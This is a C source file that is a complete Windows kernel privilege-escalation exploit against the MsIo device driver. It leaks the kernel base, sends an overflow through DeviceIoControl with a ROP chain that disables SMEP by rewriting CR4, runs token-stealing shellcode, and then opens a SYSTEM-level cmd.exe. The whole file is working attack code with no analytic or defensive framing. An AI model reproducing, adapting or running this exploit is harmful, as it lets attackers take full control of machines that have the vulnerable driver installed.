#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>

#define DEVICE_NAME "\\\\.\\MsIo"
#define IOCTL_CODE 0x80102040

typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;
typedef struct _SYSTEM_MODULE_INFORMATION {
	ULONG NumberOfModules;
	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemModuleInformation = 11
} SYSTEM_INFORMATION_CLASS;
typedef NTSTATUS (NTAPI *PNtQuerySystemInformation) (
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
);

char shellcode[] = "\x48\x31\xc0" // xor rax,rax
	"\x65\x48\x8b\x04\x25\x88\x01" // mov rax,[gs:188h]
	"\x00\x00"
	"\x48\x8b\x80\xb8\x00\x00\x00" // mov rax,[rax+0b8h]
	"\x48\x89\xc1" // mov rcx,rax
	"\x4c\x8b\x99\xb8\x04\x00\x00" // mov r11,[rcx+4b8h]
	"\x49\x83\xe3\x07" // and r11,7
	"\xba\x04\x00\x00\x00" // mov edx,4
	"\x48\x8b\x80\x48\x04\x00\x00" // mov rax,[rax+448h]
	"\x48\x2d\x48\x04\x00\x00" // sub rax,448h
	"\x48\x39\x90\x40\x04\x00\x00" // cmp [rax+440h],rdx
	"\x75\xea" // jne 26
	"\x48\x8b\x90\xb8\x04\x00\x00" // mov rdx,[rax+4b8h]
	"\x48\x83\xe2\xf0" // and rdx,0ffffffffffffff0h
	"\x4c\x09\xda" // or rdx,r11
	"\x48\x89\x91\xb8\x04\x00\x00" // mov [rcx+4b8h],rdx
	/* context restore */
	"\x65\x48\x8b\x04\x25\x88\x01" // mov rax,[gs:188h]
	"\x00\x00"
	"\x66\xc7\x80\xe4\x01\x00\x00" // mov word [rax+1e4h],0ffffh
	"\xff\xff"
	"\x48\x83\xc4\x20" // add rsp,20h
	"\xc3"; // ret

UINT64 GetKernelBase() {
	PNtQuerySystemInformation NtQuerySystemInformation;
	PSYSTEM_MODULE_INFORMATION pModuleInfo;
	PVOID kernelBase;
	ULONG len = 0;
	NTSTATUS status;

	NtQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(
		GetModuleHandleA("ntdll.dll"),
		"NtQuerySystemInformation"
	);
	if (!NtQuerySystemInformation) {
		printf("[!] GetProcAddress failed with error %lu.\n", GetLastError());
		ExitProcess(0);
	}

	NtQuerySystemInformation(
		SystemModuleInformation,
		NULL,
		0,
		&len
	);
	pModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(
		NULL,
		len,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE
	);

	status = NtQuerySystemInformation(
		SystemModuleInformation,
		pModuleInfo,
		len,
		&len
	);

	if (status != (NTSTATUS)0) {
		printf("[!] NtQuerySystemInformation failed.\n");
		ExitProcess(0);
	}

	kernelBase = pModuleInfo->Module[0].ImageBase;
	return (UINT64)kernelBase;
}

int main() {
	HANDLE hDevice;
	UINT64 kernelBase;
	LPVOID shellcode_addr;
	// char payload[16] = { '\0' };
	char payload[104] = { '\0' };
	/* for rop payload */
	UINT64 mov_rc4_rcx, pop_rcx;
	UINT64 cr4_value = 0x70678;
	/* for spawning elevated shell */
	PROCESS_INFORMATION pi;
	STARTUPINFOA si;

	/* grab a file handle to the device driver */
	hDevice = CreateFileA(
		DEVICE_NAME,
		FILE_READ_ACCESS | FILE_WRITE_ACCESS,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileA failed with error %lu.\n", GetLastError());
		ExitProcess(0);
	}

	/* prepare shellcode in userland */
	shellcode_addr = VirtualAlloc(
		NULL,
		sizeof(shellcode),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	memcpy(shellcode_addr, shellcode, sizeof(shellcode));
	printf("[+] shellcode_addr: 0x%llx\n", shellcode_addr);

	/* prepare rop gadgets for replacing cr4 */
	kernelBase = GetKernelBase();
	printf("[+] kernelBase: 0x%llx\n", kernelBase);
	mov_rc4_rcx = kernelBase + 0x5134c9;
	pop_rcx = kernelBase + 0x27b154;
	/* setup rop payload */
	// memset(payload, 'a', 16);
	memset(payload, 'a', 72);
	memcpy(payload + 72, &pop_rcx, 8);
	memcpy(payload + 80, &cr4_value, 8);
	memcpy(payload + 88, &mov_rc4_rcx, 8);
	memcpy(payload + 96, &shellcode_addr, 8);
	
	/* send payload to device driver */
	if (!DeviceIoControl(
		hDevice,
		IOCTL_CODE,
		payload,
		sizeof(payload),
		NULL,
		0,
		NULL,
		NULL
	)) {
	printf("[!] DeviceIoControl failed with error %lu.\n", GetLastError());
	ExitProcess(0);
	}

	/* spawn an elevated shell */
	ZeroMemory(&pi, sizeof(pi));
	ZeroMemory(&si, sizeof(si));
	if (!CreateProcessA(
		"C:\\Windows\\System32\\cmd.exe",
		NULL,
		NULL,
		NULL,
		0,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&si,
		&pi
	)) {
	printf("[!] CreateFileA failed with error %lu.\n", GetLastError());
	ExitProcess(0);
	}
	return 0;
}